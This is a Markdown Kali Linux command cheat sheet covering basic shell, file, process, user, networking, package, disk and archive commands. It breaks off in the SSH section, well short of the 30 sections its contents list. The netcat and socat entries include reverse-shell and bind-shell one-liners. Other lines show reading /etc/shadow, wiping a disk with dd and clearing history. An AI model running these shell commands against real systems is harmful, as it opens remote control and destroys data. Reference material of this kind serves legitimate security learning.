# 🐉 KALI LINUX — COMPLETE COMMAND REFERENCE
### The Ultimate A-Z Guide with Examples

---

## TABLE OF CONTENTS

1. [Basic Linux Commands](#1-basic-linux-commands)
2. [File & Directory Management](#2-file--directory-management)
3. [File Permissions & Ownership](#3-file-permissions--ownership)
4. [Text Processing & Editors](#4-text-processing--editors)
5. [Process Management](#5-process-management)
6. [User & Group Management](#6-user--group-management)
7. [Networking Commands](#7-networking-commands)
8. [Package Management (APT)](#8-package-management-apt)
9. [Disk & Storage Management](#9-disk--storage-management)
10. [System Information](#10-system-information)
11. [Archiving & Compression](#11-archiving--compression)
12. [SSH & Remote Access](#12-ssh--remote-access)
13. [Firewall & iptables](#13-firewall--iptables)
14. [Service Management (systemctl)](#14-service-management-systemctl)
15. [Reconnaissance & Information Gathering](#15-reconnaissance--information-gathering)
16. [Network Scanning (Nmap)](#16-network-scanning-nmap)
17. [Vulnerability Scanning](#17-vulnerability-scanning)
18. [Web Application Testing](#18-web-application-testing)
19. [Password Attacks](#19-password-attacks)
20. [Wireless Attacks](#20-wireless-attacks)
21. [Exploitation (Metasploit)](#21-exploitation-metasploit)
22. [Post Exploitation](#22-post-exploitation)
23. [Forensics & Analysis](#23-forensics--analysis)
24. [Sniffing & Spoofing](#24-sniffing--spoofing)
25. [Reverse Engineering](#25-reverse-engineering)
26. [Cryptography & Steganography](#26-cryptography--steganography)
27. [Shell Scripting Basics](#27-shell-scripting-basics)
28. [Logs & Monitoring](#28-logs--monitoring)
29. [Environment & Variables](#29-environment--variables)
30. [Miscellaneous & Useful Tricks](#30-miscellaneous--useful-tricks)

---

## 1. BASIC LINUX COMMANDS

### pwd — Print Working Directory
```bash
pwd
# Output: /home/kali
```

### ls — List Directory Contents
```bash
ls                    # basic list
ls -l                 # long format
ls -la                # include hidden files
ls -lh                # human-readable sizes
ls -lt                # sort by modification time
ls -R                 # recursive listing
ls -lS                # sort by file size
ls /etc               # list specific directory
```

### cd — Change Directory
```bash
cd /                  # go to root
cd ~                  # go to home directory
cd ..                 # go up one level
cd ../..              # go up two levels
cd -                  # go to previous directory
cd /var/log           # go to specific path
```

### echo — Print Text
```bash
echo "Hello Kali"
echo $HOME            # print variable
echo -n "no newline"  # no trailing newline
echo -e "line1\nline2"  # interpret escape sequences
echo "text" > file.txt  # write to file
echo "text" >> file.txt # append to file
```

### clear — Clear Terminal
```bash
clear
# Shortcut: Ctrl + L
```

### history — Command History
```bash
history               # show all history
history 20            # show last 20 commands
history -c            # clear history
!50                   # run command number 50
!!                    # repeat last command
!nmap                 # run last nmap command
history | grep ssh    # search history
```

### man — Manual Pages
```bash
man ls                # manual for ls
man nmap              # manual for nmap
man -k password       # search manual pages
man 5 passwd          # section 5 of passwd manual
```

### help — Built-in Help
```bash
help cd
help echo
ls --help
nmap --help
```

### which / whereis / locate / find
```bash
which python3         # find binary location
whereis nmap          # find binary, source, man pages
locate passwd         # fast file search (uses database)
updatedb              # update locate database
```

### alias — Command Shortcuts
```bash
alias ll='ls -la'
alias update='sudo apt update && sudo apt upgrade'
alias c='clear'
unalias ll            # remove alias
alias                 # list all aliases
```

### type — Command Type Info
```bash
type ls
type cd
type nmap
```

### date — Show/Set Date & Time
```bash
date
date +"%Y-%m-%d"
date +"%H:%M:%S"
date +"%d/%m/%Y %T"
```

### cal — Calendar
```bash
cal                   # current month
cal 2025              # full year
cal 12 2025           # specific month/year
```

### uptime — System Uptime
```bash
uptime
uptime -p             # pretty format
```

### whoami — Current User
```bash
whoami
```

### id — User Identity
```bash
id
id root
id kali
```

### hostname — System Hostname
```bash
hostname
hostname -I           # show IP addresses
hostname -f           # fully qualified domain name
```

### uname — Kernel Information
```bash
uname -a              # all info
uname -r              # kernel release
uname -s              # OS name
uname -m              # machine hardware
```

---

## 2. FILE & DIRECTORY MANAGEMENT

### mkdir — Make Directory
```bash
mkdir mydir
mkdir -p /opt/tools/scripts      # create parent dirs
mkdir dir1 dir2 dir3             # multiple dirs
mkdir -m 755 securedir           # set permissions
```

### rmdir — Remove Empty Directory
```bash
rmdir emptydir
rmdir -p a/b/c        # remove nested empty dirs
```

### touch — Create/Update File
```bash
touch file.txt
touch file1.txt file2.txt file3.txt
touch -t 202501010000 file.txt   # set specific timestamp
```

### cp — Copy Files
```bash
cp file.txt backup.txt
cp -r /source /destination       # copy directory recursively
cp -p file.txt dest/             # preserve permissions
cp -u file.txt dest/             # copy only if newer
cp -v file.txt dest/             # verbose
cp *.txt /backup/                # copy all .txt files
```

### mv — Move / Rename Files
```bash
mv file.txt newname.txt          # rename
mv file.txt /tmp/                # move
mv -i file.txt dest/             # prompt before overwrite
mv *.log /var/log/archive/
```

### rm — Remove Files
```bash
rm file.txt
rm -r directory/                 # remove directory recursively
rm -rf directory/                # force remove (no prompt)
rm -i file.txt                   # interactive (ask before delete)
rm -v file.txt                   # verbose
rm *.tmp                         # remove all .tmp files
```

### ln — Create Links
```bash
ln file.txt hardlink.txt         # hard link
ln -s /path/to/file symlink      # symbolic link
ln -s /usr/bin/python3 /usr/local/bin/python
ls -la symlink                   # verify symlink
```

### find — Search for Files
```bash
find / -name "passwd"            # find by name
find /home -name "*.txt"         # find all .txt files
find / -type d -name "config"    # find directories
find / -type f -size +100M       # files larger than 100MB
find / -perm 777                 # find by permissions
find / -user root                # find files owned by root
find / -mtime -7                 # modified in last 7 days
find / -name "*.log" -delete     # find and delete
find /tmp -name "*.sh" -exec chmod +x {} \;  # find and execute
find / -empty                    # find empty files
find / -name "*.conf" 2>/dev/null  # suppress errors
```

### locate — Fast File Search
```bash
locate nmap
locate -i readme                 # case-insensitive
locate "*.conf"
updatedb                         # update database
```

### stat — File Status
```bash
stat file.txt
stat /etc/passwd
```

### file — File Type
```bash
file image.png
file /bin/bash
file unknown_file
```

### cat — Concatenate / Display Files
```bash
cat file.txt
cat -n file.txt                  # show line numbers
cat file1.txt file2.txt          # concatenate
cat > newfile.txt                # create file (Ctrl+D to save)
cat /etc/passwd
cat /etc/os-release
```

### tac — Reverse cat
```bash
tac file.txt                     # print file in reverse
```

### less / more — Page Through Files
```bash
less /var/log/syslog
more /etc/passwd
less +F /var/log/syslog          # follow log (like tail -f)
# Inside less: q=quit, /search, n=next, G=end, g=start
```

### head / tail — Show File Parts
```bash
head file.txt                    # first 10 lines
head -n 20 file.txt              # first 20 lines
tail file.txt                    # last 10 lines
tail -n 20 file.txt              # last 20 lines
tail -f /var/log/syslog          # follow live updates
tail -f /var/log/apache2/access.log
```

### wc — Word Count
```bash
wc file.txt                      # lines, words, bytes
wc -l file.txt                   # line count only
wc -w file.txt                   # word count only
wc -c file.txt                   # byte count
cat /etc/passwd | wc -l          # count users
```

### diff — Compare Files
```bash
diff file1.txt file2.txt
diff -u file1.txt file2.txt      # unified format
diff -r dir1/ dir2/              # compare directories
```

### cmp — Binary Comparison
```bash
cmp file1 file2
```

### split — Split Files
```bash
split -b 100M largefile.tar.gz part_  # split by size
split -l 1000 file.txt chunk_         # split by lines
```

### shred — Secure Delete
```bash
shred -vzn 3 file.txt            # overwrite 3 times then delete
shred -u file.txt                # overwrite and delete
```

---

## 3. FILE PERMISSIONS & OWNERSHIP

### chmod — Change Permissions
```bash
chmod 755 file.sh                # rwxr-xr-x
chmod 644 file.txt               # rw-r--r--
chmod 600 private.key            # rw-------
chmod 777 script.sh              # rwxrwxrwx (all permissions)
chmod +x script.sh               # add execute permission
chmod -x script.sh               # remove execute
chmod u+x,g-w,o-r file.txt      # symbolic mode
chmod -R 755 /var/www/html       # recursive
```

### chown — Change Owner
```bash
chown root file.txt
chown kali:kali file.txt         # user:group
chown -R www-data:www-data /var/www/
chown :group file.txt            # change group only
```

### chgrp — Change Group
```bash
chgrp www-data /var/www/html
chgrp -R developers /opt/project
```

### umask — Default Permission Mask
```bash
umask                            # show current umask
umask 022                        # set umask
umask 077                        # private files (only owner)
```

### getfacl / setfacl — Access Control Lists
```bash
getfacl file.txt                 # get ACL
setfacl -m u:kali:rwx file.txt  # give user rwx
setfacl -m g:devs:rx file.txt   # give group rx
setfacl -x u:kali file.txt      # remove ACL entry
setfacl -b file.txt             # remove all ACLs
```

### lsattr / chattr — Extended Attributes
```bash
lsattr file.txt                  # list attributes
chattr +i file.txt               # make immutable
chattr -i file.txt               # remove immutable
chattr +a logfile.txt            # append only
```

---

## 4. TEXT PROCESSING & EDITORS

### grep — Search Text
```bash
grep "password" file.txt
grep -i "password" file.txt      # case-insensitive
grep -r "error" /var/log/        # recursive
grep -n "fail" auth.log          # show line numbers
grep -v "success" log.txt        # invert match
grep -c "error" log.txt          # count matches
grep -l "password" *.txt         # list matching files
grep -w "root" /etc/passwd       # whole word match
grep -A 3 "error" log.txt        # 3 lines after match
grep -B 2 "error" log.txt        # 2 lines before match
grep -E "^root|^kali" /etc/passwd  # extended regex
grep -o "[0-9]\+\.[0-9]\+\.[0-9]\+\.[0-9]\+" file  # extract IPs
cat /etc/passwd | grep bash      # pipe usage
```

### awk — Text Processing
```bash
awk '{print $1}' file.txt        # print first column
awk '{print $1,$3}' file.txt     # print columns 1 and 3
awk -F: '{print $1}' /etc/passwd # use : as delimiter
awk -F: '{print $1,$3}' /etc/passwd  # username and UID
awk '/error/{print}' log.txt     # print lines with "error"
awk '{sum+=$1} END{print sum}' numbers.txt  # sum column
awk 'NR==5' file.txt             # print line 5
awk 'NR>=5 && NR<=10' file.txt   # print lines 5-10
awk '{print NR, $0}' file.txt    # add line numbers
awk -F: '$3==0{print $1}' /etc/passwd  # find root-level users
```

### sed — Stream Editor
```bash
sed 's/old/new/' file.txt        # replace first occurrence
sed 's/old/new/g' file.txt       # replace all occurrences
sed -i 's/old/new/g' file.txt    # in-place edit
sed -n '5,10p' file.txt          # print lines 5-10
sed '/^#/d' file.txt             # delete comment lines
sed '/^$/d' file.txt             # delete empty lines
sed 's/[0-9]//g' file.txt        # remove all digits
sed 's/^/  /' file.txt           # add indent
sed -n 's/.*IP: \([0-9.]*\).*/\1/p' log.txt  # extract IP
```

### cut — Extract Columns
```bash
cut -d: -f1 /etc/passwd          # first field (delimiter :)
cut -d: -f1,3 /etc/passwd        # fields 1 and 3
cut -c1-10 file.txt              # first 10 characters
cut -d',' -f2 data.csv           # CSV second column
```

### sort — Sort Lines
```bash
sort file.txt                    # alphabetical
sort -r file.txt                 # reverse
sort -n numbers.txt              # numeric sort
sort -u file.txt                 # unique only
sort -k2 file.txt                # sort by column 2
sort -t: -k3 -n /etc/passwd      # sort by UID
```

### uniq — Remove Duplicates
```bash
uniq file.txt                    # remove adjacent duplicates
uniq -c file.txt                 # count occurrences
uniq -d file.txt                 # show only duplicates
sort file.txt | uniq             # proper deduplication
sort file.txt | uniq -c | sort -rn  # frequency count
```

### tr — Translate Characters
```bash
tr 'a-z' 'A-Z' < file.txt       # lowercase to uppercase
tr -d '\n' < file.txt            # remove newlines
tr -d ' ' < file.txt             # remove spaces
tr ':' '\n' <<< $PATH            # split PATH
echo "hello" | tr 'a-z' 'A-Z'
```

### paste — Merge Lines
```bash
paste file1.txt file2.txt        # side by side
paste -d',' file1.txt file2.txt  # comma separated
```

### tee — Read and Write
```bash
ls -la | tee output.txt          # display and save
nmap 192.168.1.1 | tee scan.txt
command | tee -a log.txt         # append to file
```

### xargs — Build Command Arguments
```bash
find /tmp -name "*.tmp" | xargs rm
cat hosts.txt | xargs -I{} ping -c1 {}
find . -name "*.py" | xargs grep "import"
echo "file1 file2 file3" | xargs touch
```

### strings — Extract Strings from Binary
```bash
strings /bin/bash | head -50
strings malware.bin | grep http
strings firmware.bin | grep password
```

### xxd — Hex Dump
```bash
xxd file.bin                     # hex dump
xxd -l 64 file.bin               # first 64 bytes
xxd file.bin > hex.txt           # save to file
xxd -r hex.txt > original.bin    # reverse: hex to binary
```

### od — Octal Dump
```bash
od -c file.txt                   # character dump
od -x file.txt                   # hex dump
od -An -tx1 file.bin             # no address, hex bytes
```

### nano — Simple Text Editor
```bash
nano file.txt
nano -l file.txt                 # show line numbers
nano +50 file.txt                # open at line 50
# Ctrl+O = save, Ctrl+X = exit, Ctrl+W = search
```

### vim — Advanced Text Editor
```bash
vim file.txt
vi file.txt
# :w = save, :q = quit, :wq = save & quit, :q! = force quit
# i = insert mode, Esc = normal mode
# /word = search, n = next, :%s/old/new/g = replace all
# dd = delete line, yy = copy line, p = paste
# gg = go to start, G = go to end
```

### gedit / mousepad — GUI Text Editors
```bash
gedit file.txt
mousepad file.txt
```

---

## 5. PROCESS MANAGEMENT

### ps — Process Status
```bash
ps                               # current shell processes
ps aux                           # all processes (detailed)
ps aux | grep apache             # find specific process
ps -ef                           # full format listing
ps -u kali                       # processes by user
ps --sort=-%mem | head           # top memory users
ps --sort=-%cpu | head           # top CPU users
```

### top — Real-Time Process Monitor
```bash
top
top -u kali                      # filter by user
top -p 1234                      # monitor specific PID
# Inside top: q=quit, k=kill, r=renice, M=sort by memory
```

### htop — Enhanced Process Monitor
```bash
htop
htop -u kali
htop -p 1234,5678
```

### kill — Send Signals to Processes
```bash
kill 1234                        # SIGTERM (graceful)
kill -9 1234                     # SIGKILL (force kill)
kill -15 1234                    # SIGTERM explicit
kill -STOP 1234                  # suspend process
kill -CONT 1234                  # resume process
kill -HUP 1234                   # reload config
kill -l                          # list all signals
```

### killall — Kill by Name
```bash
killall firefox
killall -9 apache2
killall -u kali                  # kill all by user
```

### pkill — Pattern Kill
```bash
pkill firefox
pkill -9 -u kali                 # kill all kali's processes
pkill -f "python script.py"      # match full command line
```

### pgrep — Find Process IDs
```bash
pgrep apache2
pgrep -u root                    # by user
pgrep -l sshd                    # list names
pgrep -f "python"                # match full cmdline
```

### jobs — Show Background Jobs
```bash
jobs
jobs -l                          # with PIDs
```

### bg / fg — Background / Foreground
```bash
Ctrl+Z                           # suspend current process
bg                               # resume in background
fg                               # bring to foreground
fg %1                            # specific job number
bg %2
```

### nohup — Run After Logout
```bash
nohup command &
nohup ./scan.sh > output.log 2>&1 &
nohup python3 server.py &
```

### screen — Terminal Multiplexer
```bash
screen                           # new session
screen -S mysession              # named session
screen -ls                       # list sessions
screen -r mysession              # reattach
screen -d -r mysession           # detach and reattach
# Ctrl+A D = detach, Ctrl+A C = new window, Ctrl+A N = next window
```

### tmux — Terminal Multiplexer (Advanced)
```bash
tmux                             # new session
tmux new -s mysession            # named session
tmux ls                          # list sessions
tmux attach -t mysession         # attach
tmux kill-session -t mysession
# Ctrl+B D = detach, Ctrl+B C = new window, Ctrl+B % = split vertical
# Ctrl+B " = split horizontal, Ctrl+B Arrow = navigate panes
```

### nice / renice — Process Priority
```bash
nice -n 10 command               # start with lower priority
nice -n -10 command              # higher priority (root)
renice +10 -p 1234               # change running process
renice -5 -p 1234                # increase priority (root)
```

### strace — Trace System Calls
```bash
strace ls
strace -p 1234                   # attach to running process
strace -o output.txt ls
strace -e trace=network curl http://example.com
```

### lsof — List Open Files
```bash
lsof                             # all open files
lsof -p 1234                     # by PID
lsof -u kali                     # by user
lsof -i :80                      # by port
lsof -i :22                      # SSH connections
lsof -i tcp                      # all TCP
lsof /var/log/syslog             # who has file open
lsof -n -i | grep LISTEN         # listening services
```

### fuser — File User
```bash
fuser 80/tcp                     # what's using port 80
fuser -k 80/tcp                  # kill processes using port
fuser file.txt                   # who's using file
```

### timeout — Run with Time Limit
```bash
timeout 10 ping google.com
timeout 60s ./longscript.sh
timeout --kill-after=5 10 command
```

### watch — Repeat Command
```bash
watch -n 2 'ps aux | grep apache'
watch -n 1 netstat -an
watch -d ls -la                  # highlight changes
```

---

## 6. USER & GROUP MANAGEMENT

### useradd — Add User
```bash
useradd newuser
useradd -m newuser               # create home directory
useradd -m -s /bin/bash newuser  # with bash shell
useradd -m -G sudo newuser       # add to sudo group
useradd -u 1500 -g 1000 newuser  # specific UID/GID
```

### userdel — Delete User
```bash
userdel username
userdel -r username              # remove home directory too
```

### usermod — Modify User
```bash
usermod -aG sudo kali            # add to group
usermod -aG docker,www-data kali # add to multiple groups
usermod -s /bin/zsh kali         # change shell
usermod -l newname oldname       # rename user
usermod -L username              # lock account
usermod -U username              # unlock account
usermod -d /newhome -m username  # change home dir
```

### passwd — Change Password
```bash
passwd                           # change own password
passwd username                  # change another user's (root)
passwd -l username               # lock account
passwd -u username               # unlock account
passwd -e username               # expire password (force change)
passwd -d username               # remove password
passwd -S username               # password status
```

### su — Switch User
```bash
su root
su - root                        # full login environment
su - kali
su -c "command" username         # run command as user
```

### sudo — Execute as Root
```bash
sudo command
sudo -i                          # interactive root shell
sudo -s                          # root shell
sudo -u user command             # run as specific user
sudo !!                          # run last command as root
sudo -l                          # list allowed commands
sudo visudo                      # edit sudoers file
```

### groupadd / groupdel / groupmod
```bash
groupadd hackers
groupdel hackers
groupmod -n newname oldname      # rename group
groupmod -g 1500 groupname       # change GID
```

### groups — Show Groups
```bash
groups
groups kali
```

### id — User/Group IDs
```bash
id
id kali
id -u kali                       # UID only
id -g kali                       # GID only
id -G kali                       # all group IDs
```

### w / who / last — Login Info
```bash
w                                # who's logged in + activity
who                              # logged in users
last                             # login history
last -10                         # last 10 logins
last kali                        # specific user
lastlog                          # last login per user
lastb                            # failed login attempts
```

### /etc/passwd / /etc/shadow / /etc/group
```bash
cat /etc/passwd                  # user accounts
cat /etc/shadow                  # password hashes (root only)
cat /etc/group                   # groups
getent passwd kali               # user info
getent group sudo                # group info
```

---

## 7. NETWORKING COMMANDS

### ifconfig — Network Interface Config (legacy)
```bash
ifconfig                         # all interfaces
ifconfig eth0                    # specific interface
ifconfig eth0 up                 # bring up interface
ifconfig eth0 down               # bring down
ifconfig eth0 192.168.1.100      # set IP
ifconfig eth0 192.168.1.100 netmask 255.255.255.0
ifconfig eth0 promisc            # enable promiscuous mode
ifconfig eth0 -promisc           # disable
```

### ip — Modern Network Config
```bash
ip a                             # show all addresses
ip addr show eth0                # specific interface
ip addr add 192.168.1.100/24 dev eth0  # add IP
ip addr del 192.168.1.100/24 dev eth0  # remove IP
ip link show                     # show links
ip link set eth0 up              # bring up
ip link set eth0 down            # bring down
ip link set eth0 promisc on      # promiscuous mode
ip route show                    # routing table
ip route add default via 192.168.1.1  # default gateway
ip route add 10.0.0.0/8 via 192.168.1.1
ip neigh                         # ARP table
ip -s link                       # interface statistics
```

### ping — Test Connectivity
```bash
ping google.com
ping -c 4 192.168.1.1            # send 4 packets
ping -i 0.2 192.168.1.1          # interval 0.2s
ping -s 1000 192.168.1.1         # packet size
ping -t 64 192.168.1.1           # TTL
ping -f 192.168.1.1              # flood ping (root)
ping6 ::1                        # IPv6 ping
```

### traceroute / tracepath — Trace Route
```bash
traceroute google.com
traceroute -n google.com         # no DNS resolution
traceroute -I google.com         # use ICMP
traceroute -T google.com         # use TCP SYN
traceroute -p 443 google.com     # specific port
tracepath google.com
```

### netstat — Network Statistics (legacy)
```bash
netstat -an                      # all connections
netstat -tlnp                    # listening TCP ports
netstat -ulnp                    # listening UDP ports
netstat -r                       # routing table
netstat -i                       # interface stats
netstat -s                       # protocol stats
netstat -p                       # show PIDs
```

### ss — Socket Statistics (modern)
```bash
ss -an                           # all sockets
ss -tlnp                         # listening TCP
ss -ulnp                         # listening UDP
ss -s                            # summary
ss -tp                           # TCP with PID
ss dst 192.168.1.1               # connections to IP
ss sport = :80                   # by source port
```

### nslookup / dig / host — DNS Lookup
```bash
nslookup google.com
nslookup 8.8.8.8
dig google.com
dig google.com A                 # A records
dig google.com MX                # mail records
dig google.com NS                # name servers
dig google.com ANY               # all records
dig @8.8.8.8 google.com          # specific DNS server
dig -x 8.8.8.8                   # reverse lookup
host google.com
host -t mx google.com
host 8.8.8.8
```

### whois — Domain/IP Info
```bash
whois google.com
whois 8.8.8.8
whois -h whois.arin.net 8.8.8.8
```

### curl — URL Transfer
```bash
curl http://example.com
curl -o output.html http://example.com   # save to file
curl -O http://example.com/file.zip      # save as original name
curl -I http://example.com               # headers only
curl -u user:pass http://example.com     # basic auth
curl -X POST -d "data=test" http://example.com
curl -H "Cookie: session=abc" http://example.com
curl -k https://example.com             # ignore SSL
curl --proxy http://127.0.0.1:8080 http://example.com
curl -A "Mozilla/5.0" http://example.com  # custom User-Agent
curl -L http://example.com               # follow redirects
curl -v http://example.com               # verbose
curl -s http://example.com               # silent
curl -b cookies.txt -c cookies.txt http://example.com
curl --data-urlencode "param=value with spaces" http://example.com
curl -X DELETE http://api.example.com/resource/1
curl -X PUT -H "Content-Type: application/json" -d '{"key":"val"}' http://api.example.com
```

### wget — Web Download
```bash
wget http://example.com/file.zip
wget -O myfile.zip http://example.com/file.zip
wget -c http://example.com/file.zip       # continue download
wget -q http://example.com                # quiet mode
wget --no-check-certificate https://example.com
wget -r -np http://example.com/           # recursive download
wget --limit-rate=100k http://example.com/file
wget --tries=3 http://example.com/file
wget --user=user --password=pass http://example.com
wget -i urls.txt                          # download from list
```

### nc / netcat — Swiss Army Knife
```bash
nc -zv 192.168.1.1 80            # port check
nc -zv 192.168.1.1 1-1000        # port scan range
nc -lvp 4444                     # listen on port 4444
nc 192.168.1.1 4444              # connect to listener
nc -lvp 4444 > received.txt      # receive file
nc 192.168.1.1 4444 < file.txt   # send file
nc -e /bin/bash 192.168.1.1 4444  # reverse shell
nc -lvp 4444 -e /bin/bash        # bind shell
echo "GET / HTTP/1.0" | nc google.com 80  # HTTP request
```

### socat — Advanced Netcat
```bash
socat TCP-LISTEN:4444,fork EXEC:/bin/bash    # bind shell
socat TCP:192.168.1.1:4444 EXEC:/bin/bash    # reverse shell
socat - TCP:192.168.1.1:4444                 # connect
socat TCP-LISTEN:443,fork TCP:192.168.1.1:80 # port forward
socat FILE:file.txt TCP:192.168.1.1:4444     # send file
```

### arp — ARP Table
```bash
arp -a                           # show ARP table
arp -n                           # numeric format
arp -d 192.168.1.1               # delete entry
arp -s 192.168.1.1 aa:bb:cc:dd:ee:ff  # add static
```

### route — Routing Table
```bash
route -n                         # show routing table
route add default gw 192.168.1.1  # add default gateway
route add -net 10.0.0.0/8 gw 192.168.1.1
route del default gw 192.168.1.1
```

### iptables (see dedicated section 13)

### tcpdump — Packet Capture
```bash
tcpdump -i eth0                  # capture on eth0
tcpdump -i any                   # all interfaces
tcpdump -c 100                   # capture 100 packets
tcpdump -w capture.pcap          # write to file
tcpdump -r capture.pcap          # read from file
tcpdump host 192.168.1.1         # filter by host
tcpdump port 80                  # filter by port
tcpdump src 192.168.1.1          # source IP
tcpdump dst 192.168.1.1          # destination IP
tcpdump tcp                      # TCP only
tcpdump udp                      # UDP only
tcpdump 'tcp port 80 and host 192.168.1.1'
tcpdump -A port 80               # ASCII output
tcpdump -X port 80               # hex + ASCII
tcpdump -nn port 443             # no DNS/port resolution
tcpdump -i eth0 -s 0 -w full.pcap  # full packets
```

### nmap (see dedicated section 16)

### proxychains — Route Through Proxy
```bash
proxychains nmap -sT 192.168.1.0/24
proxychains curl http://example.com
proxychains firefox
# Edit /etc/proxychains4.conf to set proxy
```

---

## 8. PACKAGE MANAGEMENT (APT)

### apt — Package Manager
```bash
apt update                       # update package lists
apt upgrade                      # upgrade installed packages
apt full-upgrade                 # full distribution upgrade
apt install nmap                 # install package
apt install -y nmap              # auto-confirm
apt install nmap wireshark metasploit-framework  # multiple
apt remove nmap                  # remove package
apt purge nmap                   # remove + config files
apt autoremove                   # remove unused deps
apt autoclean                    # clean old packages
apt search nmap                  # search packages
apt show nmap                    # package info
apt list --installed             # list installed
apt list --upgradable            # list upgradable
apt-cache search scanner         # search cache
apt-cache show nmap              # detailed info
apt-cache depends nmap           # show dependencies
apt-get install -f               # fix broken packages
dpkg -l                          # list installed (dpkg)
dpkg -i package.deb              # install .deb file
dpkg -r packagename              # remove package
dpkg --configure -a              # configure pending
```

### pip / pip3 — Python Packages
```bash
pip3 install requests
pip3 install -r requirements.txt
pip3 list                        # list installed
pip3 show requests               # package info
pip3 uninstall requests
pip3 upgrade requests
pip3 search flask                # search
```

### gem — Ruby Packages
```bash
gem install wpscan
gem list
gem uninstall wpscan
```

### snap — Snap Packages
```bash
snap install code --classic
snap list
snap remove code
snap refresh
```

---

## 9. DISK & STORAGE MANAGEMENT

### df — Disk Free Space
```bash
df -h                            # human readable
df -H                            # SI units
df /home                         # specific mount
df -T                            # show filesystem type
df -i                            # inode usage
```

### du — Disk Usage
```bash
du -h /var                       # directory size
du -sh /var                      # summary
du -sh *                         # sizes of all items
du -sh /* 2>/dev/null            # root level
du -ah /var | sort -rh | head -20  # top 20 largest
```

### lsblk — List Block Devices
```bash
lsblk
lsblk -f                         # show filesystems
lsblk -o NAME,SIZE,TYPE,MOUNTPOINT
```

### fdisk — Partition Manager
```bash
fdisk -l                         # list partitions
fdisk /dev/sdb                   # manage disk
# m=help, n=new, d=delete, p=print, w=write, q=quit
```

### parted — Partition Tool
```bash
parted -l                        # list partitions
parted /dev/sdb                  # interactive
parted /dev/sdb mklabel gpt      # create GPT label
parted /dev/sdb mkpart primary 0% 100%
```

### mount / umount — Mount Filesystems
```bash
mount /dev/sdb1 /mnt             # mount device
mount -t ntfs /dev/sdb1 /mnt     # specify fs type
mount -o ro /dev/sdb1 /mnt       # read-only
mount -o loop file.iso /mnt      # mount ISO
umount /mnt                      # unmount
umount -l /mnt                   # lazy unmount
mount | grep sdb                 # show mounts
cat /etc/fstab                   # permanent mounts
```

### mkfs — Create Filesystem
```bash
mkfs.ext4 /dev/sdb1
mkfs.ntfs /dev/sdb1
mkfs.vfat /dev/sdb1              # FAT32
mkfs.xfs /dev/sdb1
```

### fsck — Filesystem Check
```bash
fsck /dev/sdb1
fsck -y /dev/sdb1                # auto-fix
fsck.ext4 /dev/sdb1
```

### dd — Data Duplicator
```bash
dd if=/dev/zero of=/dev/sdb      # wipe disk
dd if=/dev/sda of=backup.img     # disk image
dd if=kali.iso of=/dev/sdb bs=4M status=progress  # write ISO
dd if=/dev/urandom of=file bs=1M count=100  # random data
dd if=/dev/sda | gzip > disk.gz  # compressed image
```

### sync — Flush Disk Cache
```bash
sync
```

### smartctl — Disk Health
```bash
smartctl -a /dev/sda             # full disk info
smartctl -t short /dev/sda       # short test
smartctl -H /dev/sda             # health check
```

### cryptsetup — Disk Encryption
```bash
cryptsetup luksFormat /dev/sdb1  # encrypt partition
cryptsetup luksOpen /dev/sdb1 myencrypt  # open
cryptsetup luksClose myencrypt   # close
cryptsetup luksDump /dev/sdb1    # info
```

---

## 10. SYSTEM INFORMATION

### uname — Kernel Info
```bash
uname -a                         # all info
uname -r                         # kernel version
uname -s                         # OS name
uname -m                         # architecture
```

### lscpu — CPU Info
```bash
lscpu
cat /proc/cpuinfo
```

### free — Memory Usage
```bash
free -h                          # human readable
free -m                          # in megabytes
free -g                          # in gigabytes
watch -n 1 free -h               # live monitor
cat /proc/meminfo
```

### vmstat — Virtual Memory Stats
```bash
vmstat
vmstat -s                        # summary
vmstat 1 5                       # 5 reports, 1 sec interval
```

### lspci — PCI Devices
```bash
lspci
lspci -v                         # verbose
lspci | grep -i network          # network cards
lspci | grep -i vga              # graphics
```

### lsusb — USB Devices
```bash
lsusb
lsusb -v                         # verbose
lsusb -t                         # tree
```

### dmesg — Kernel Messages
```bash
dmesg
dmesg | tail -50
dmesg | grep -i error
dmesg | grep -i usb
dmesg -w                         # follow live
dmesg --level=err,warn
```

### journalctl — Systemd Logs
```bash
journalctl                       # all logs
journalctl -f                    # follow
journalctl -n 50                 # last 50 lines
journalctl -u ssh                # specific service
journalctl --since "1 hour ago"
journalctl --since "2024-01-01" --until "2024-01-02"
journalctl -p err                # errors only
journalctl -k                    # kernel messages
```

### /proc — Process/System Info
```bash
cat /proc/version
cat /proc/cpuinfo
cat /proc/meminfo
cat /proc/net/tcp
cat /proc/net/arp
ls /proc/1234/                   # process info by PID
cat /proc/1234/cmdline           # command of process
cat /proc/sys/net/ipv4/ip_forward  # IP forwarding status
```

---

## 11. ARCHIVING & COMPRESSION

### tar — Archive
```bash
tar -cvf archive.tar files/      # create archive
tar -xvf archive.tar             # extract
tar -xvf archive.tar -C /tmp/    # extract to specific dir
tar -tvf archive.tar             # list contents
tar -czvf archive.tar.gz files/  # create + gzip
tar -xzvf archive.tar.gz         # extract gzip
tar -cjvf archive.tar.bz2 files/ # create + bzip2
tar -xjvf archive.tar.bz2        # extract bzip2
tar -cJvf archive.tar.xz files/  # create + xz
tar --exclude='*.log' -czvf archive.tar.gz folder/
```

### gzip / gunzip — GNU Compression
```bash
gzip file.txt                    # compress (creates .gz)
gzip -k file.txt                 # keep original
gzip -9 file.txt                 # best compression
gunzip file.txt.gz               # decompress
gzip -d file.txt.gz              # same as gunzip
gzip -l file.gz                  # list contents
zcat file.gz                     # view without extracting
```

### bzip2 / bunzip2 — BZip Compression
```bash
bzip2 file.txt
bzip2 -k file.txt                # keep original
bunzip2 file.txt.bz2
bzcat file.bz2                   # view contents
```

### zip / unzip — Zip Archive
```bash
zip archive.zip file1 file2
zip -r archive.zip directory/    # recursive
zip -e secure.zip file.txt       # encrypted
unzip archive.zip
unzip archive.zip -d /tmp/       # specific destination
unzip -l archive.zip             # list contents
unzip -p archive.zip file.txt    # extract to stdout
```

### 7zip — 7-Zip
```bash
7z a archive.7z files/           # create
7z x archive.7z                  # extract
7z l archive.7z                  # list
7z e archive.7z -o/tmp/          # extract to dir
7z a -p archive.7z files/        # password protected
```

### rar — RAR Archive
```bash
rar a archive.rar files/
unrar x archive.rar
unrar l archive.rar
rar -hp archive.rar files/       # password protected
```

---

## 12. SSH & REMOTE ACCESS

### ssh — Secure Shell
```bash
ssh user@192.168.1.1
ssh -p 2222 user@192.168.1.1     # custom port
ssh -i key.pem user@192.168.1.1  # SSH key
ssh -L 8080:localhost:80 user@host  # local port forward
ssh -R 4444:localhost:22 user@host  # remote port forward
